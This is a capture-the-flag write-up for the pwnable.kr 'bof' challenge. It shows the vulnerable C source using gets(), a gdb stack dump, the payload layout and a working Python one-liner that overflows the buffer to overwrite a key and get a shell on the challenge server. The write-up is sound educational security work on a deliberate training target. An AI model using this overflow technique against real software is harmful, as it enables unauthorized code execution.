# Description
Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000

# Exploitation
```bash
pawn1454@ubuntu:~$ nc pwnable.kr 9000
AAAA
overflow me : 
Nah..
pawn1454@ubuntu:~$ 
```
Connect to 9000 port, It may receives string and can be overflowed.

The source code is:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```
I can overwrite the `key` variable.
```assembly
   0x5655564f <func+35>:	call   0xf7e66890 <gets>
=> 0x56555654 <func+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5655565b <func+47>:	jne    0x5655566b <func+63>
```
In stack:
```
gdb-peda$ x/32x $esp
0xffffd5d0:	0xffffd5ec	0xffffd674	0xf7fb8000	0x0000d267
0xffffd5e0:	0xffffffff	0x0000002f	0xf7e14dc8	0x41414141
0xffffd5f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd600:	0x41414141	0x41414141	0x41414141	0x8ab22d00
0xffffd610:	0xf7fb8000	0xf7fb8000	0xffffd638	0x5655569f
0xffffd620:	0xdeadbeef	0x56555250	0x565556b9	0x00000000
0xffffd630:	0xf7fb8000	0xf7fb8000	0x00000000	0xf7e20637
0xffffd640:	0x00000001	0xffffd6d4	0xffffd6dc	0x00000000
gdb-peda$ x/x $ebp+8
0xffffd620:	0xdeadbeef
```
The payload will be:
```
----------------------------------------
| "A"*32 | "B"*20 | "\xbe\xba\xfe\xca" |
----------------------------------------
```

# Payload
```
pawn1454@ubuntu:~$ (python -c 'print "A"*32+"B"*20+"\xbe\xba\xfe\xca"';cat)|nc pwnable.kr 9000
id
uid=1008(bof) gid=1008(bof) groups=1008(bof)
```
